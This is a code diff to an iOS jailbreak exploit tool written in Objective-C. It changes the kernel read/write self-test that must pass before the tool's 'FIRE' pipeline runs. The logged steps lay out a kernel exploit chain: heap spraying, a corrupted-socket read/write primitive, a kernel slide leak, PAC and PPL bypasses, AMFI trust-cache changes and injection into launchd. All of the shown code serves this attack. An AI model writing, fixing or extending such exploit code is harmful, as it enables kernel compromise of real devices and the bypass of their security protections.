@@ -374,7 +374,7 @@ static void ak_printKRWSteps(NSMutableString *s) {
     ak_log(s, @"  2 43748 fill into fat type-3 OOL kdata (A14 occupancy live; G71 fill_cap SKIP)");
     ak_log(s, @"  3 SocketKRW Adopt+Arm of smashed pair → VerifyPrimitive R/W round-trip");
     ak_log(s, @"  4 kread leaked object's vtable → text VA → slide");
-    ak_log(s, @"  5 board.commitSlide: kread(kbase)==MH_MAGIC_64 and kbase+0x1c is a kptr");
+    ak_log(s, @"  5 board.commitSlide: kread(kbase)==0x100000cfeedfacf and kbase+8 kernel typeinfo");
     ak_log(s, @"  6 this slot: pmap_cs, AMFI TC, opainject launchdhook, Sileo then Zebra, respring");
 }
 
@@ -410,8 +410,11 @@ static int ak_spawn(NSString *path, NSArray<NSString *> *args, NSMutableString *
     return code;
 }
 
-/* True KRW test: Mach-O magic at kbase, then kbase+0x1c is a kernel VA.
-   Heap leaks and blit 0xA5 do not pass. */
+/* True KRW test (upstream ClearSword identification criteria): magic+cputype
+   at kbase and a kernel typeinfo word at kbase+8. Heap leaks and blit 0xA5
+   do not pass. The old kbase+0x1c "kernel VA" gate was unfalsifiable: that
+   offset is Mach-header reserved | first LC cmd (header data on every
+   device), never a pointer. */
 static BOOL ak_krwSelfTest(NSMutableString *s) {
     Lum1naBoard *b = [Lum1naBoard shared];
     Lum1naSocketKRWContext *ctx = (Lum1naSocketKRWContext *)b.krwContext;
@@ -442,23 +445,20 @@ static BOOL ak_krwSelfTest(NSMutableString *s) {
         ak_log(s, @"[-] KRW test FAIL — kbase is not a Mach-O. hasKread is a lie; refuse inject.");
         return NO;
     }
-    uint64_t vptr = ctx ? Lum1naSocketKRW_KRead64(ctx, kbase + 0x1c) : 0;
-    if (vptr < 0xFFFFFF8000000000ULL && Lum1naLibkrw_IsLive()) vptr = Lum1naLibkrw_KRead64(kbase + 0x1c);
-    if (vptr < 0xFFFFFF8000000000ULL && Lum1naCS2Core_IsLive()) vptr = Lum1naCS2Core_KRead64(kbase + 0x1c);
-    ak_log(s, @"[*] KRW test kread64(kbase+0x1c)=0x%llx", (unsigned long long)vptr);
-    if (vptr < 0xFFFFFF8000000000ULL) {
-        ak_log(s, @"[-] KRW test FAIL — kbase+0x1c is not a kernel VA");
+    uint64_t typeinfo = ctx ? Lum1naSocketKRW_KRead64(ctx, kbase + 8) : 0;
+    if (typeinfo != 0x200000000ULL && typeinfo != 0xc00000002ULL && typeinfo != 0xcc0000002ULL && Lum1naLibkrw_IsLive()) {
+        typeinfo = Lum1naLibkrw_KRead64(kbase + 8);
+    }
+    if (typeinfo != 0x200000000ULL && typeinfo != 0xc00000002ULL && typeinfo != 0xcc0000002ULL && Lum1naCS2Core_IsLive()) {
+        typeinfo = Lum1naCS2Core_KRead64(kbase + 8);
+    }
+    ak_log(s, @"[*] KRW test kread64(kbase+8)=0x%llx (want 0x200000000/0xc00000002/0xcc0000002)",
+           (unsigned long long)typeinfo);
+    if (typeinfo != 0x200000000ULL && typeinfo != 0xc00000002ULL && typeinfo != 0xcc0000002ULL) {
+        ak_log(s, @"[-] KRW test FAIL — kbase+8 is not a kernel Mach-O typeinfo");
         return NO;
     }
-    uint8_t buf[16] = {0};
-    BOOL haveVersion = ctx ? Lum1naSocketKRW_KReadBuf(ctx, vptr, buf, sizeof(buf)) : NO;
-    if (!haveVersion && Lum1naLibkrw_IsLive()) haveVersion = Lum1naLibkrw_KReadBuf(vptr, buf, sizeof(buf));
-    if (!haveVersion && Lum1naCS2Core_IsLive()) haveVersion = Lum1naCS2Core_KReadBuf(vptr, buf, sizeof(buf));
-    if (haveVersion) {
-        ak_log(s, @"[*] KRW test version bytes %02x %02x %02x %02x %02x %02x %02x %02x",
-               buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7]);
-    }
-    ak_log(s, @"[+] KRW test PASS — Mach-O magic + version ptr. Injection may fire.");
+    ak_log(s, @"[+] KRW test PASS — Mach-O magic+cputype + kernel typeinfo. Injection may fire.");
     return YES;
 }
 
@@ -540,7 +540,7 @@ static void ak_tryInstallPkgman(NSMutableString *s) {
     NSMutableString *s = [NSMutableString string];
     [s appendString:
      @"LUM1NA CONSTELLATION (credit: opa334/Dopamine 3.0.10 BaseBin + Relaxin/RootHide):\n"
-     @"  KRW test: kread32(kbase)==MH_MAGIC_64 and kbase+0x1c is a kernel VA.\n"
+     @"  KRW test: kread32(kbase)==MH_MAGIC_64 and kbase+8 kernel typeinfo.\n"
      @"  0 HOLD until that test via board.commitSlide.\n"
      @"  PAC: badRecovery Fugu14 kcall (T5). 65330 is a consumer after a write.\n"
      @"  PPL: Titan gfx PTE on A14 (T6); momentarius A12/A13 End 26.0.1; dmaFail A15+.\n"
@@ -616,7 +616,7 @@ static void ak_tryInstallPkgman(NSMutableString *s) {
 }
 
 /* FIRE phase: KRW self-test gate, then the real pipeline. HOLD unless
-   kread32(kbase)==MH_MAGIC_64 and kbase+0x1c is a kernel VA. */
+   kread32(kbase)==MH_MAGIC_64 and kbase+8 kernel typeinfo. */
 + (NSString *)fire {
     P06xLogBegin(AK_TAG);
     NSMutableString *s = [NSMutableString string];
